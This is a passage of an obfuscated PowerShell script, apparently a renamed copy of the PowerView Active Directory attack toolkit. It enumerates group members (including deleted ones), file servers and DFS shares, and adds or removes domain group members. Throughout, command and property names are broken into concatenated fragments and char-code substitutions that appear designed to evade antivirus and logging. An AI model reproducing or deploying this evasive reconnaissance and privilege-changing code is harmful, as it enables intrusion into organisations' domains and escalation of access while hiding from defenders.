                    &('Write-V'+'erb'+'ose') ('[Get-DomainGrou'+'pM'+'e'+'mb'+'er] '+'U'+'sing'+' '+'LD'+'AP '+'m'+'a'+'tch'+'ing '+'ru'+'le '+'to'+' '+'rec'+'u'+'rse '+'on'+' '+"'$GroupFoundDN', "+'only'+' '+'use'+'r '+'a'+'ccoun'+'ts '+'w'+'ill '+'b'+'e '+'re'+'turn'+'ed.')
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange((('dist'+'inguis'+'h'+'edName')))
                    $Members = $GroupSearcher.FindAll() | &('ForE'+'ach-Obje'+'ct') {$_.Properties.distinguishedname[0]}
                }
                $Null = $SearcherArguments.Remove(('R'+'aw'))
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | &('Wh'+'e'+'re'+'-Object') {$_} | &('For'+'Each-O'+'b'+'ject') {
                    $IdentityInstance = $_.Replace('(', (('JmT'+'28') -CrEplAce  ([Char]74+[Char]109+[Char]84),[Char]92)).Replace(')', (('D'+'Ii'+'29')  -RepLACe([cHAr]68+[cHAr]73+[cHAr]105),[cHAr]92))
                    if ($IdentityInstance -match ('^S-'+'1-')) {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match ('^'+'CN=')) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters[('D'+'omain')]) -and (-not $PSBoundParameters[('Sear'+'ch'+'Bas'+'e')])) {
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('DC'+'='))) -replace ('DC'+'='),'' -replace ',','.'
                            &('W'+'rite-Ve'+'rbose') ('[Get'+'-Domai'+'nGro'+'upMember'+'] '+'Extrac'+'ted'+' '+'d'+'omain '+"'$IdentityDomain' "+'fro'+'m '+"'$IdentityInstance'")
                            $SearcherArguments[('Domai'+'n')] = $IdentityDomain
                            $GroupSearcher = &('Get'+'-DomainSea'+'rch'+'er') @SearcherArguments
                            if (-not $GroupSearcher) {
                                &('W'+'ri'+'te-W'+'arning') ('[Ge'+'t-D'+'omainG'+'roupMem'+'ber] '+'Una'+'ble '+'to'+' '+'retriev'+'e '+'do'+'mai'+'n '+'s'+'ear'+'cher '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | &('ForE'+'ach-Obj'+'ect') { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace((('Y'+'gR'+'28') -rEplACE ([cHAR]89+[cHAR]103+[cHAR]82),[cHAR]92), '(').Replace((('a'+'in29') -CREpLaCE  'ain',[CHaR]92), ')') | &('Conve'+'r'+'t-ADN'+'ame') -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments[('Do'+'m'+'ain')] = $GroupDomain
                            &('Writ'+'e'+'-Verb'+'ose') ('['+'Get-Domain'+'Grou'+'pMemb'+'er] '+'Extr'+'a'+'cted '+'do'+'main '+"'$GroupDomain' "+'from'+' '+"'$IdentityInstance'")
                            $GroupSearcher = &('Get-'+'D'+'oma'+'inSear'+'cher') @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters[('LDAPF'+'ilt'+'er')]) {
                    &('W'+'rit'+'e-Verbos'+'e') ('[G'+'e'+'t'+'-D'+'omainGrou'+'pMember'+'] '+'U'+'si'+'ng '+'additi'+'on'+'al '+'L'+'DAP '+'filte'+'r'+': '+"$LDAPFilter")
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                &('W'+'ri'+'te-Verbo'+'se') "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    &('Write'+'-W'+'ar'+'ning') ('['+'Ge'+'t-DomainG'+'roup'+'Me'+'mber'+'] '+'Er'+'ror '+'searchi'+'n'+'g '+'for'+' '+'g'+'roup'+' '+'with'+' '+'identi'+'ty'+' '+"'$Identity': "+"$_")
                    $Members = @()
                }

                $GroupFoundName = ''
                $GroupFoundDN = ''

                if ($Result) {
                    $Members = $Result.properties.item(('mem'+'ber'))

                    if ($Members.count -eq 0) {
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $Null = $GroupSearcher.PropertiesToLoad.Add(('sam'+'account'+'nam'+'e'))
                            $Null = $GroupSearcher.PropertiesToLoad.Add(('di'+'sti'+'nguished'+'n'+'ame'))

                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like ('me'+'m'+'ber;range'+'='+'*')
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item(('sa'+'m'+'accountna'+'m'+'e'))[0]
                                $GroupFoundDN = $Result.properties.item(('disting'+'uish'+'ed'+'name'))[0]

                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item(('sam'+'ac'+'coun'+'tn'+'ame'))[0]
                        $GroupFoundDN = $Result.properties.item(('distinguis'+'hed'+'n'+'ame'))[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }

                    if ($PSBoundParameters[('Doma'+'i'+'n')]) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf(('D'+'C='))) -replace ('DC'+'='),'' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments[('Ide'+'n'+'tity')] = $Member
                    $ObjectSearcherArguments[('Ra'+'w')] = $True
                    $ObjectSearcherArguments[('Pro'+'pert'+'i'+'es')] = ('distingu'+'ished'+'name,cn,sa'+'mac'+'c'+'oun'+'t'+'nam'+'e,ob'+'je'+'ctsid,objectclass')
                    $Object = &('Get-Do'+'mainObj'+'ec'+'t') @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }

                if ($Properties) {
                    $GroupMember = &('N'+'ew-Obj'+'ect') PSObject
                    $GroupMember | &('Ad'+'d-Memb'+'er') Noteproperty ('G'+'r'+'oupDomain') $GroupFoundDomain
                    $GroupMember | &('Ad'+'d-Me'+'m'+'ber') Noteproperty ('Gro'+'upNa'+'m'+'e') $GroupFoundName
                    $GroupMember | &('A'+'dd-'+'Memb'+'er') Noteproperty ('Gro'+'upDi'+'stingui'+'sh'+'e'+'dName') $GroupFoundDN

                    if ($Properties.objectsid) {
                        $MemberSID = ((&('N'+'ew-'+'Object') System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match (('Fo'+'reignSe'+'curityPrin'+'c'+'i'+'palsKQsS-1'+'-'+'5-'+'21')  -cRePLacE'KQs',[cHar]124)) {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = &('Con'+'vert-ADNam'+'e') -Identity $MemberSID -OutputType ('DomainSimp'+'l'+'e') @ADNameArguments

                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    &('Wri'+'te'+'-Wa'+'rnin'+'g') ('[Ge'+'t'+'-'+'Dom'+'ainGroupMe'+'m'+'ber]'+' '+'Er'+'ror '+'c'+'onve'+'rting'+' '+"$MemberDN")
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                &('Wri'+'te-W'+'a'+'rn'+'ing') ('['+'Get-Do'+'ma'+'inGroupMemb'+'er'+']'+' '+'E'+'rror '+'con'+'verti'+'n'+'g '+"$MemberDN")
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf(('DC'+'='))) -replace ('D'+'C='),'' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        try {
                            $MemberName = &('Con'+'ve'+'rtF'+'rom-'+'SID') -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            $MemberName = $Properties.cn[0]
                        }
                    }

                    if ($Properties.objectclass -match ('com'+'puter')) {
                        $MemberObjectClass = ('c'+'omputer')
                    }
                    elseif ($Properties.objectclass -match ('g'+'roup')) {
                        $MemberObjectClass = ('grou'+'p')
                    }
                    elseif ($Properties.objectclass -match ('u'+'ser')) {
                        $MemberObjectClass = ('us'+'er')
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | &('Add-'+'Memb'+'er') Noteproperty ('Mem'+'berDomai'+'n') $MemberDomain
                    $GroupMember | &('A'+'d'+'d-Member') Noteproperty ('Member'+'Nam'+'e') $MemberName
                    $GroupMember | &('Add'+'-Me'+'mbe'+'r') Noteproperty ('Memb'+'er'+'Disti'+'nguishedNa'+'me') $MemberDN
                    $GroupMember | &('Add'+'-M'+'ember') Noteproperty ('Me'+'m'+'berOb'+'jectC'+'lass') $MemberObjectClass
                    $GroupMember | &('Add-Memb'+'e'+'r') Noteproperty ('MemberS'+'ID') $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, ('PowerB'+'l'+'a.G'+'roupMem'+'be'+'r'))
                    $GroupMember

                    if ($PSBoundParameters[('R'+'ecurse')] -and $MemberDN -and ($MemberObjectClass -match ('grou'+'p'))) {
                        &('Write-V'+'erb'+'ose') ('[Get'+'-DomainG'+'ro'+'up'+'Me'+'mber] '+'Ma'+'nua'+'lly '+'re'+'cursin'+'g '+'on'+' '+'g'+'roup'+': '+"$MemberDN")
                        $SearcherArguments[('Ident'+'i'+'ty')] = $MemberDN
                        $Null = $SearcherArguments.Remove(('P'+'rope'+'rties'))
                        &('G'+'e'+'t'+'-Do'+'mainGrou'+'pMem'+'ber') @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSUs'+'e'+'De'+'cla'+'re'+'dVarsMo'+'reTha'+'nAss'+'ignments'), '')]
    [OutputType(('P'+'owe'+'rBla.'+'D'+'om'+'ainGrou'+'pM'+'emb'+'erDeleted'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Dis'+'tinguished'+'Nam'+'e'), ('S'+'a'+'mAc'+'countNa'+'me'), ('N'+'ame'), ('M'+'emberDisti'+'nguishedN'+'ame'), ('M'+'em'+'berName'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fi'+'lter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('A'+'DSPat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Doma'+'inCo'+'ntr'+'o'+'ller'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('One'+'Level'), ('Sub'+'t'+'ree'))]
        [String]
        $SearchScope = ('Subtr'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ('Pro'+'pe'+'rti'+'es')    =   ('msds'+'-r'+'eplvalue'+'metadat'+'a'),('distin'+'g'+'ui'+'shed'+'name')
            ('Ra'+'w')           =   $True
            ('LDAPFi'+'lt'+'er')    =   ('('+'objectCatego'+'ry=gro'+'up'+')')
        }
        if ($PSBoundParameters[('Doma'+'in')]) { $SearcherArguments[('Doma'+'i'+'n')] = $Domain }
        if ($PSBoundParameters[('LDAPF'+'ilte'+'r')]) { $SearcherArguments[('LD'+'APFi'+'lter')] = $LDAPFilter }
        if ($PSBoundParameters[('Sear'+'chBa'+'se')]) { $SearcherArguments[('S'+'earch'+'Base')] = $SearchBase }
        if ($PSBoundParameters[('Se'+'rv'+'er')]) { $SearcherArguments[('Serv'+'e'+'r')] = $Server }
        if ($PSBoundParameters[('Sea'+'rchSc'+'ope')]) { $SearcherArguments[('Sear'+'chScop'+'e')] = $SearchScope }
        if ($PSBoundParameters[('R'+'esul'+'t'+'Pa'+'geSize')]) { $SearcherArguments[('ResultPageS'+'i'+'z'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('Serv'+'e'+'r'+'T'+'imeLimit')]) { $SearcherArguments[('Ser'+'v'+'e'+'rTi'+'meLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombs'+'to'+'ne')]) { $SearcherArguments[('Tombst'+'on'+'e')] = $Tombstone }
        if ($PSBoundParameters[('C'+'red'+'ential')]) { $SearcherArguments[('Cre'+'d'+'ential')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[('I'+'d'+'entity')]) { $SearcherArguments[('Identit'+'y')] = $Identity }

        &('Get-Doma'+'inOb'+'j'+'e'+'ct') @SearcherArguments | &('ForEac'+'h-Obj'+'ect') {
            $ObjectDN = $_.Properties[('d'+'isti'+'nguishedn'+'ame')][0]
            ForEach($XMLNode in $_.Properties[('ms'+'ds-re'+'pl'+'valuemetad'+'a'+'ta')]) {
                $TempObject = [xml]$XMLNode | &('Sel'+'ec'+'t-Obje'+'ct') -ExpandProperty ('D'+'S'+'_R'+'EPL_VALU'+'E_M'+'ET'+'A_DA'+'TA') -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if (($TempObject.pszAttributeName -Match ('memb'+'er')) -and (($TempObject.dwVersion % 2) -eq 0 )) {
                        $Output = &('New-'+'O'+'bject') PSObject
                        $Output | &('Add'+'-Memb'+'er') NoteProperty ('Group'+'DN') $ObjectDN
                        $Output | &('A'+'dd-Memb'+'er') NoteProperty ('Member'+'D'+'N') $TempObject.pszObjectDn
                        $Output | &('Add-'+'M'+'ember') NoteProperty ('TimeFir'+'stA'+'dded') $TempObject.ftimeCreated
                        $Output | &('Add-'+'Mem'+'ber') NoteProperty ('TimeDel'+'et'+'e'+'d') $TempObject.ftimeDeleted
                        $Output | &('A'+'dd'+'-Mem'+'ber') NoteProperty ('LastOriginat'+'i'+'n'+'g'+'Chan'+'ge') $TempObject.ftimeLastOriginatingChange
                        $Output | &('Add-'+'Memb'+'er') NoteProperty ('Ti'+'mesAd'+'ded') ($TempObject.dwVersion / 2)
                        $Output | &('A'+'d'+'d-M'+'ember') NoteProperty ('Last'+'O'+'rigin'+'atingD'+'s'+'aDN') $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, ('Pow'+'erBl'+'a.DomainGr'+'oupM'+'ember'+'D'+'eleted'))
                        $Output
                    }
                }
                else {
                    &('Write'+'-'+'Ve'+'r'+'bose') ('[Get'+'-D'+'omai'+'nGro'+'upMemberDelet'+'ed] '+'Er'+'r'+'or '+'retr'+'ie'+'vi'+'ng '+(('wV'+'gmsds-replva'+'lue'+'me'+'t'+'adatawVg ')-ReplaCE 'wVg',[CHAR]39)+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}


function Add-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSho'+'uldPr'+'oc'+'ess'), '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias(('G'+'r'+'oupName'), ('GroupIde'+'nti'+'t'+'y'))]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('M'+'emberId'+'ent'+'ity'), ('M'+'em'+'ber'), ('Dist'+'ingu'+'ishe'+'dName'))]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            ('Iden'+'tity') = $Identity
        }
        if ($PSBoundParameters[('Domai'+'n')]) { $ContextArguments[('D'+'omain')] = $Domain }
        if ($PSBoundParameters[('Creden'+'t'+'ial')]) { $ContextArguments[('Cre'+'dent'+'ial')] = $Credential }

        $GroupContext = &('Ge'+'t'+'-Pr'+'incipalCont'+'ex'+'t') @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                &('Write'+'-War'+'ning') ('[A'+'dd-Do'+'m'+'ainGro'+'upM'+'em'+'ber] '+'E'+'rror '+'fi'+'ndi'+'ng '+'the'+' '+'g'+'ro'+'up '+'id'+'entit'+'y '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match (('.'+'+WyI'+'WyI.+')-CrEPlAcE 'WyI',[CHar]92)) {
                    $ContextArguments[('Id'+'ent'+'ity')] = $Member
                    $UserContext = &('Get'+'-'+'P'+'rincipalCo'+'n'+'text') @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                &('Write-Ver'+'b'+'ose') ('[Ad'+'d-Dom'+'ain'+'Gro'+'upM'+'embe'+'r] '+'Add'+'in'+'g '+'mem'+'ber '+"'$Member' "+'t'+'o '+'gro'+'up '+"'$Identity'")
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Add($Member)
                $Group.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Should'+'Pro'+'cess'), '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias(('GroupN'+'am'+'e'), ('Group'+'Ide'+'n'+'tity'))]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Membe'+'rIde'+'n'+'ti'+'ty'), ('Membe'+'r'), ('Di'+'sting'+'uishedN'+'ame'))]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            ('Iden'+'tit'+'y') = $Identity
        }
        if ($PSBoundParameters[('Doma'+'in')]) { $ContextArguments[('D'+'o'+'main')] = $Domain }
        if ($PSBoundParameters[('Cr'+'ede'+'ntia'+'l')]) { $ContextArguments[('Cre'+'den'+'t'+'ial')] = $Credential }

        $GroupContext = &('Get-Pr'+'in'+'cipal'+'Co'+'n'+'text') @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                &('Write-War'+'nin'+'g') ('[Re'+'m'+'ove-D'+'oma'+'inGr'+'oupMember] '+'Err'+'or '+'fi'+'nd'+'ing '+'t'+'he '+'g'+'rou'+'p '+'i'+'dentity'+' '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match (('.'+'+8af8af'+'.+').ReplAce(([cHAR]56+[cHAR]97+[cHAR]102),[StRING][cHAR]92))) {
                    $ContextArguments[('Iden'+'tity')] = $Member
                    $UserContext = &('G'+'e'+'t'+'-Pr'+'incipalCo'+'ntext') @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                &('Wr'+'ite-Ve'+'rbose') ('[Remo'+'ve'+'-DomainG'+'rou'+'pMember]'+' '+'R'+'emovi'+'ng '+'mem'+'b'+'er '+"'$Member' "+'from'+' '+'gr'+'ou'+'p '+"'$Identity'")
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Remove($Member)
                $Group.Save()
            }
        }
    }
}


function Get-DomainFileServer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SS'+'h'+'oul'+'dProcess'), '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias(('Do'+'main'+'N'+'ame'), ('Nam'+'e'))]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'ilt'+'er'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSP'+'a'+'th'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'ain'+'Control'+'l'+'er'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('O'+'neLev'+'el'), ('S'+'ubtree'))]
        [String]
        $SearchScope = ('Subtr'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            Param([String]$Path)

            if ($Path -and ($Path.split((('HSt'+'HSt').RePLAcE(([char]72+[char]83+[char]116),[sTrInG][char]92))).Count -ge 3)) {
                $Temp = $Path.split((('zI'+'rz'+'Ir')-CREPlace 'zIr',[char]92))[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $SearcherArguments = @{
            ('LDAPF'+'i'+'lter') = (('(&(sa'+'mAccoun'+'tType=80'+'5'+'306368'+')(!(us'+'er'+'A'+'ccount'+'Contr'+'o'+'l:1'+'.'+'2.840.11'+'3556.'+'1'+'.4.803'+':='+'2'+')'+')'+'({0'+'}(homedire'+'ct'+'o'+'ry='+'*)('+'scri'+'p'+'tpat'+'h=*)'+'(profi'+'lepa'+'th=*))'+')')  -f  [CHaR]124)
            ('Prop'+'ertie'+'s') = ('hom'+'edi'+'recto'+'ry'+','+'scrip'+'t'+'p'+'a'+'th,'+'profilepath')
        }
        if ($PSBoundParameters[('Se'+'a'+'rchBas'+'e')]) { $SearcherArguments[('S'+'e'+'a'+'rchBase')] = $SearchBase }
        if ($PSBoundParameters[('Ser'+'ver')]) { $SearcherArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('Sear'+'chS'+'cope')]) { $SearcherArguments[('Searc'+'h'+'Scope')] = $SearchScope }
        if ($PSBoundParameters[('Resu'+'ltP'+'ageSize')]) { $SearcherArguments[('Res'+'ultPa'+'geSi'+'z'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'er'+'ve'+'rTimeLimit')]) { $SearcherArguments[('S'+'e'+'rverTime'+'L'+'imit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombsto'+'n'+'e')]) { $SearcherArguments[('Tom'+'bstone')] = $Tombstone }
        if ($PSBoundParameters[('Creden'+'t'+'ia'+'l')]) { $SearcherArguments[('Credenti'+'a'+'l')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[('Do'+'main')]) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments[('Dom'+'ain')] = $TargetDomain
                $UserSearcher = &('Ge'+'t-Dom'+'ain'+'Searcher') @SearcherArguments
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[('ho'+'m'+'edirec'+'tory')]) {&('Sp'+'lit-Pat'+'h')($UserResult.Properties[('ho'+'medire'+'ct'+'ory')])}if ($UserResult.Properties[('scri'+'ptpa'+'th')]) {&('Split-'+'Pa'+'th')($UserResult.Properties[('scr'+'i'+'ptpa'+'th')])}if ($UserResult.Properties[('profi'+'l'+'epath')]) {&('Spl'+'it-Pa'+'th')($UserResult.Properties[('p'+'rofilepat'+'h')])}}) | &('S'+'ort-Ob'+'jec'+'t') -Unique
            }
        }
        else {
            $UserSearcher = &('Get-'+'D'+'oma'+'inSear'+'ch'+'er') @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[('h'+'omed'+'ir'+'ect'+'ory')]) {&('Spli'+'t-'+'Path')($UserResult.Properties[('homed'+'i'+'rec'+'t'+'ory')])}if ($UserResult.Properties[('scri'+'ptpa'+'th')]) {&('S'+'plit-P'+'ath')($UserResult.Properties[('scrip'+'t'+'path')])}if ($UserResult.Properties[('p'+'rofi'+'lepath')]) {&('Split-P'+'a'+'th')($UserResult.Properties[('pr'+'ofile'+'p'+'ath')])}}) | &('S'+'o'+'rt-Obj'+'ect') -Unique
        }
    }
}


function Get-DomainDFSShare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'ou'+'ldPro'+'c'+'ess'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSUse'+'Decla'+'redVars'+'More'+'ThanAss'+'ign'+'m'+'e'+'nt'+'s'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SUs'+'e'+'Ap'+'provedVerbs'), '')]
    [OutputType(('System.Managemen'+'t'+'.Autom'+'ation.'+'PSCus'+'to'+'mObje'+'ct'))]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias(('Domain'+'N'+'ame'), ('N'+'ame'))]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSPat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'ai'+'nCon'+'troller'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('OneLe'+'ve'+'l'), ('Subtre'+'e'))]
        [String]
        $SearchScope = ('Su'+'b'+'tree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet(('A'+'ll'), 'V1', '1', 'V2', '2')]
        [String]
        $Version = ('Al'+'l')
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('SearchBa'+'s'+'e')]) { $SearcherArguments[('Sea'+'r'+'chBase')] = $SearchBase }
        if ($PSBoundParameters[('S'+'e'+'rver')]) { $SearcherArguments[('S'+'er'+'ver')] = $Server }
        if ($PSBoundParameters[('Searc'+'h'+'Scope')]) { $SearcherArguments[('S'+'earc'+'hScope')] = $SearchScope }
        if ($PSBoundParameters[('Re'+'su'+'ltPageSize')]) { $SearcherArguments[('R'+'esult'+'P'+'ageSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Serv'+'erTim'+'e'+'Limit')]) { $SearcherArguments[('Se'+'r'+'verTim'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('To'+'mbsto'+'ne')]) { $SearcherArguments[('To'+'mbsto'+'ne')] = $Tombstone }
        if ($PSBoundParameters[('C'+'re'+'dential')]) { $SearcherArguments[('Cre'+'de'+'ntial')] = $Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

